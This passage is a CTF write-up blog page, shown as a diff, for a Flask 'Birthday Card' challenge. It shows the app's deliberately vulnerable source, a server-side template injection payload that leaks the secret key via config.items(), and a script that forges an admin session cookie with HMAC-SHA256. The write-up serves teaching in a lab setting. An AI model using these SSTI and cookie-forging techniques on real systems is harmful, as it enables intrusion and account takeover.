+</span></span><span style="display:flex;"><span>            final_message <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;message_final&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> validator<span style="color:#f92672">.</span>security1(recipient, sender, message, final_message) <span style="color:#f92672">and</span> validator<span style="color:#f92672">.</span>security2(recipient, sender, message, final_message):
+</span></span><span style="display:flex;"><span>                template <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;link rel=&#34;stylesheet&#34; href=&#34;static/style.css&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;link href=&#34;https://fonts.googleapis.com/css?family=Poppins:300,400,600&amp;display=swap&#34; rel=&#34;stylesheet&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &lt;div class=&#34;card-preview&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &lt;h1&gt;Your Personalized Card&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &lt;div class=&#34;card&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                &lt;h2&gt;From: </span><span style="color:#e6db74">{</span>sender<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h2&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                &lt;h2&gt;To: </span><span style="color:#e6db74">{</span>recipient<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h2&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                &lt;p&gt;</span><span style="color:#e6db74">{</span>message<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                &lt;h1&gt;</span><span style="color:#e6db74">{</span>final_message<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &lt;a class=&#34;new-card-link&#34; href=&#34;/&#34;&gt;Create Another Card&lt;/a&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> :
+</span></span><span style="display:flex;"><span>                template<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;either the recipient or sender or message input is more than 50 letters&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            app<span style="color:#f92672">.</span>jinja_env <span style="color:#f92672">=</span> env    
+</span></span><span style="display:flex;"><span>            app<span style="color:#f92672">.</span>jinja_env<span style="color:#f92672">.</span>globals<span style="color:#f92672">.</span>update({
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;validator&#39;</span>: validator()
+</span></span><span style="display:flex;"><span>            })
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> render_template_string(template)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;link rel=&#34;stylesheet&#34; href=&#34;static/style.css&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;h1&gt;Error: </span><span style="color:#e6db74">{</span>str(e)<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;br&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;p&gt;Please try again. &lt;a href=&#34;/&#34;&gt;Back to Card Generator&lt;/a&gt;&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &#34;&#34;&#34;</span>, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/debug/test&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test_debug</span>():
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;user&#34;</span>)
+</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;Host&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> host <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;localhost:3030&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Access restricted to localhost:3030, this endpoint is only development purposes&#34;</span>, <span style="color:#ae81ff">403</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;You must be logged in to test debugging.&#34;</span>, <span style="color:#ae81ff">403</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Debugging error: SECRET_KEY=</span><span style="color:#e6db74">{</span>KEY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Debugging error occurred.&#34;</span>, <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/admin/report&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">admin_report</span>():
+</span></span><span style="display:flex;"><span>    auth_cookie <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;session&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> auth_cookie:
+</span></span><span style="display:flex;"><span>        abort(<span style="color:#ae81ff">403</span>, <span style="color:#e6db74">&#34;Unauthorized access.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        token, signature <span style="color:#f92672">=</span> auth_cookie<span style="color:#f92672">.</span>rsplit(<span style="color:#e6db74">&#34;.&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">from</span> app.sign <span style="color:#f92672">import</span> initFn
+</span></span><span style="display:flex;"><span>        signer <span style="color:#f92672">=</span> initFn(KEY)
+</span></span><span style="display:flex;"><span>        sign_token_function <span style="color:#f92672">=</span> signer<span style="color:#f92672">.</span>get_signer()
+</span></span><span style="display:flex;"><span>        valid_signature <span style="color:#f92672">=</span> sign_token_function(token)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> valid_signature <span style="color:#f92672">!=</span> signature:
+</span></span><span style="display:flex;"><span>            abort(<span style="color:#ae81ff">403</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Invalid token.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> token <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Flag: p_ctf</span><span style="color:#e6db74">{redacted}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Access denied: admin only.&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        abort(<span style="color:#ae81ff">403</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Invalid token format: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.after_request</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clear_imports</span>(response):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;app.sign&#39;</span> <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>modules:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">del</span> sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;app.sign&#39;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;app.sign&#39;</span> <span style="color:#f92672">in</span> globals():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">del</span> globals()[<span style="color:#e6db74">&#39;app.sign&#39;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response
+</span></span></code></pre></div>
+</details>
+<h3 id="used-of-jinja">Used of Jinja</h3>
+<p>I quickly glanced through the code and saw <code>Jinja</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>            app<span style="color:#f92672">.</span>jinja_env <span style="color:#f92672">=</span> env    
+</span></span><span style="display:flex;"><span>            app<span style="color:#f92672">.</span>jinja_env<span style="color:#f92672">.</span>globals<span style="color:#f92672">.</span>update({
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;validator&#39;</span>: validator()
+</span></span><span style="display:flex;"><span>            })
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> render_template_string(template)
+</span></span></code></pre></div><p>This immediately made me think of Server-side Template Injection (SSTI), so I quickly returned to the target site and tested <code>{{ '{{' }} 7*7 }}</code> and indeed SSTI, is possible</p>
+<p><img src="/images/BirthdayCard-1.png" alt="Image Description"></p>
+<h3 id="sanitization">Sanitization</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">validator</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">security</span>():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> _b
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">security1</span>(a, b, c, d):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;validator&#39;</span> <span style="color:#f92672">in</span> a <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;validator&#39;</span> <span style="color:#f92672">in</span> b <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;validator&#39;</span> <span style="color:#f92672">in</span> c <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;validator&#39;</span> <span style="color:#f92672">in</span> d:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">in</span> a <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">in</span> b <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">in</span> c <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">in</span> d:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">security2</span>(a, b, c, d):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(a) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">50</span> <span style="color:#f92672">and</span> len(b) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">50</span> <span style="color:#f92672">and</span> len(c) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">50</span> <span style="color:#f92672">and</span> len(d) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">50</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> :
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span></code></pre></div><p>This ensures that the input doesn&rsquo;t contain the string <code>validator</code> or <code>os</code>, and that it has a maximum length of 50 characters.</p>
+<p>To solve this challenge, we don&rsquo;t need to bypass these checks, but they are needed in the harder version of the challenge(Deathday Card).</p>
+<p>For that I highly recommend reading this: <a href="https://nullbrunk.github.io/posts/pragyan-deathdaycard/">Nullbrunk Write-up for the Deathday Card Challenge</a>.</p>
+<p>Going back to the challenge&hellip;</p>
+<h3 id="adminreport-endpoint">/admin/report endpoint</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/admin/report&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">admin_report</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Checks if the `Cookie` header contains a cookie-name called `session`</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># If not it returns a 403</span>
+</span></span><span style="display:flex;"><span>    auth_cookie <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;session&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> auth_cookie:
+</span></span><span style="display:flex;"><span>        abort(<span style="color:#ae81ff">403</span>, <span style="color:#e6db74">&#34;Unauthorized access.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># This means that the cookie-value would look like --&gt; token.signature</span>
+</span></span><span style="display:flex;"><span>        token, signature <span style="color:#f92672">=</span> auth_cookie<span style="color:#f92672">.</span>rsplit(<span style="color:#e6db74">&#34;.&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># This indicates that there is a file called sign.py</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">from</span> app.sign <span style="color:#f92672">import</span> initFn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># KEY = os.getenv(&#34;APP_SECRET_KEY&#34;, &#34;default_secret_key&#34;)</span>
+</span></span><span style="display:flex;"><span>        signer <span style="color:#f92672">=</span> initFn(KEY)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#Creating a valid signature</span>
+</span></span><span style="display:flex;"><span>        sign_token_function <span style="color:#f92672">=</span> signer<span style="color:#f92672">.</span>get_signer()
+</span></span><span style="display:flex;"><span>        valid_signature <span style="color:#f92672">=</span> sign_token_function(token)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Checks if the signature from the cookie-value is not the same as the created valid_signature</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># If False then it continues but if True then it returns a 403</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> valid_signature <span style="color:#f92672">!=</span> signature:
+</span></span><span style="display:flex;"><span>            abort(<span style="color:#ae81ff">403</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Invalid token.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># If the first part of the cookie-value is equal to &#34;admin&#34; then it gives us the flag.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># If not then it returns a 403</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> token <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span>: <span style="color:#75715e"># We now know that the token is &#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Flag: p_ctf</span><span style="color:#e6db74">{redacted}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Access denied: admin only.&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        abort(<span style="color:#ae81ff">403</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Invalid token format: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p><em><strong>Please read the comments for my explanation of what the code is doing</strong></em></p>
+<p>With this, to get the flag we just need to generate a valid session:</p>
+<ul>
+<li><code>Token</code> = <code>&quot;admin&quot;</code></li>
+<li><code>Key</code> = <code>unknown</code></li>
+<li><code>Algorithm</code> used to generate a valid signature = <code>unknown</code></li>
+</ul>
+<p>Since we have an SSTI it was pretty easy to leak the value of <code>KEY</code></p>
+<p>By using this payload: <code>{{ '{{' }}config.items()}}</code> I was able to leak it :P</p>
+<p><img src="/images/BirthdayCard-2.png" alt="Image Description"></p>
+<p>So we now have this:</p>
+<ul>
+<li><code>Token</code> = <code>&quot;admin&quot;</code></li>
+<li><code>Key</code> = <code>&quot;dsbfeif3uwf6bes878hgi&quot;</code></li>
+<li><code>Algorithm</code> used to generate a valid signature = <code>unknown</code></li>
+</ul>
+<p>For the last part I actually just guessed it xD I figured I&rsquo;d try to use HMAC-SHA-256 since it&rsquo;s a common choice to generate a signature.</p>
+<h2 id="genpy">gen.py</h2>
+<p>With all of that, I created this script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hmac
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Secret key</span>
+</span></span><span style="display:flex;"><span>KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;dsbfeif3uwf6bes878hgi&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Token</span>
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>signature <span style="color:#f92672">=</span> hmac<span style="color:#f92672">.</span>new(KEY, token<span style="color:#f92672">.</span>encode(), hashlib<span style="color:#f92672">.</span>sha256)<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>auth_cookie <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>signature<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(auth_cookie)
+</span></span></code></pre></div><p>Running <code>gen.py</code> returns -&gt; <code>admin.dc92ab47061ce7a0922596817589737de0b8dde08e7fbe6c7772ad5f87ea9f0b</code></p>
+<h2 id="flag">Flag</h2>
+<p>To check if that is a valid <code>cookie-value</code>, I used it and made a request to <code>/admin/report</code> and&hellip;</p>
+<p><img src="/images/BirthdayCard-3.png" alt="Image Description"></p>
+<p>Finally, we got the <code>Flag: p_ctf{S3rVer_STI_G0es_hArd}</code></p>
+<p>That&rsquo;s all for this write-up! Thanks for reading, and have a nice day :D</p>
+<p>-<em><strong>Datsuraku147</strong></em></p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="http://github.com/datsuraku147" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://x.com/MDatsuraku" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="/index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2026 Datsuraku.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
